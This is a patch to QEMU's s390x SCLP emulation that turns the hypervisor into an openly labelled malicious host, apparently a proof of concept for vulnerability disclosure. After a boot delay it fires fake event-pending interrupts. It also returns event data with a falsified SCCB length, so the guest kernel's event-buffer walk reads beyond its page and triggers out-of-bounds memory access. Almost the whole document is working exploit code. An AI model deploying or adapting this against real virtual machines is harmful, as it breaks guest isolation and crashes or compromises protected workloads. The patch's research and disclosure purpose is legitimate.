@@ -14,6 +14,7 @@
 
 #include "qemu/osdep.h"
 #include "qemu/units.h"
+#include "qemu/timer.h"
 #include "qapi/error.h"
 #include "hw/core/boards.h"
 #include "system/memory.h"
@@ -292,6 +293,46 @@ out_write:
     return 0;
 }
 
+/*
+ * Malicious-PoC state. The guest's SCLP event machinery coming up (its
+ * first event-mask negotiation) starts the attack clock; after the boot
+ * delay every tick reports a pending event, and every Read-Event-Data is
+ * answered with the poisoned buffer. Until then all responses are
+ * genuine, so the initial handshake, the early console and most of the
+ * boot are undisturbed.
+ */
+#define SCLP_POC_DELAY_MS 2000
+#define SCLP_POC_KICK_MS  1
+#define SCLP_POC_LIE      0xfff0u
+
+static bool poc_hostile;
+static QEMUTimer *poc_timer;
+static unsigned int poc_reads;
+static unsigned int poc_kicks;
+static bool poc_verbose;
+
+/*
+ * Malicious: claim an event is pending with an empty service signal. KVM
+ * strips the event-pending bits from SCCB completion deliveries, so this
+ * standalone signal -- the same one the console devices raise for real
+ * input -- is what makes the guest's driver queue a Read-Event-Data.
+ */
+static void poc_kick(void)
+{
+    if (poc_verbose && ++poc_kicks % 4096 == 0) {
+        fprintf(stderr, "poc: %u kicks, %u reads\n", poc_kicks, poc_reads);
+    }
+    sclp_service_interrupt(0);
+}
+
+static void poc_timer_fn(void *opaque)
+{
+    poc_hostile = true;
+    poc_kick();
+    timer_mod(poc_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME) +
+              SCLP_POC_KICK_MS);
+}
+
 int sclp_service_call(S390CPU *cpu, uint64_t sccb, uint32_t code)
 {
     CPUS390XState *env = &cpu->env;
@@ -351,6 +392,69 @@ int sclp_service_call(S390CPU *cpu, uint64_t sccb, uint32_t code)
     }
 
     sclp_c->execute(sclp, work_sccb, code);
+
+    /*
+     * --- Maliciously modified hypervisor (Secure-Execution threat model) ---
+     *
+     * A well-behaved host returns an event-buffer chain that fits inside the
+     * guest's SCCB buffer and reports its true length. This one lies: after
+     * the boot delay it answers every Read-Event-Data with a single event
+     * buffer and an SCCB length field that runs far past the buffer.
+     * The guest's sclp_dispatch_evbufs() bounds its walk by that
+     * host-controlled length (offset < sccb->length) even though the buffer
+     * is a fixed page, so it reads event buffers clean off the end of the
+     * allocation -> KASAN slab-out-of-bounds in the interrupt path, with no
+     * guest cooperation.
+     *
+     * We only write header.length bytes back (below), so the length field is
+     * a pure lie; the payload never leaves the guest's own buffer.
+     */
+    if ((code & SCLP_CMD_CODE_MASK) == SCLP_CMD_WRITE_EVENT_MASK && !poc_timer) {
+        /*
+         * Malicious: the guest's event machinery is up -- start the phony
+         * event-pending clock. The delay lets the guest register its
+         * consoles, so the reports of the provoked reads are not lost to a
+         * panic before any console exists.
+         */
+        poc_timer = timer_new_ms(QEMU_CLOCK_REALTIME, poc_timer_fn, NULL);
+        timer_mod(poc_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME) +
+                  SCLP_POC_DELAY_MS);
+        poc_verbose = !!getenv("SCLP_POC_VERBOSE");
+        if (poc_verbose) {
+            fprintf(stderr, "poc: attack clock armed\n");
+        }
+    }
+
+    if (poc_hostile && (code & SCLP_CMD_CODE_MASK) == SCLP_CMD_READ_EVENT_DATA) {
+        uint8_t *p = (uint8_t *)work_sccb;
+        unsigned int slot = be16_to_cpu(header.length) + 8 * poc_reads;
+
+        /*
+         * The lone event buffer's length lands the walk's very next step
+         * beyond the page, at a fresh offset on every read. Past the page the
+         * chain continues in whatever memory happens to follow, so only a
+         * step landing on poisoned shadow (a slab redzone, say) actually
+         * faults; the scan steps through the window the length lie opens
+         * until one does.
+         */
+        if (slot >= SCLP_POC_LIE - 8) {
+            timer_del(poc_timer);
+            poc_hostile = false;
+            fprintf(stderr, "poc: no poisoned shadow in the window past the "
+                    "read page after %u reads\n", poc_reads);
+        } else {
+            stw_be_p(&p[8], slot - 8);
+            p[10] = 0x33;       /* type: no registered receiver */
+            work_sccb->h.response_code =
+                cpu_to_be16(SCLP_RC_NORMAL_COMPLETION);
+            work_sccb->h.length = cpu_to_be16(SCLP_POC_LIE);   /* the lie */
+            poc_reads++;
+            if (poc_verbose && poc_reads % 1024 == 0) {
+                fprintf(stderr, "poc: %u reads, scanning at %u\n",
+                        poc_reads, slot + 8);
+            }
+        }
+    }
 out_write:
     ret = address_space_write(as, sccb, attrs,
                               work_sccb, be16_to_cpu(header.length));
@@ -372,6 +476,12 @@ static void service_interrupt(SCLPDevice *sclp, uint32_t sccb)
 
     /* Indicate whether an event is still pending */
     param |= efc->event_pending(ef) ? 1 : 0;
+
+    /*
+     * Malicious: an empty signal (sccb 0) from poc_kick() reports a pending
+     * event even though there is none.
+     */
+    param |= poc_hostile && !sccb;
 
     if (!param) {
         /* No need to send an interrupt, there's nothing to be notified about */
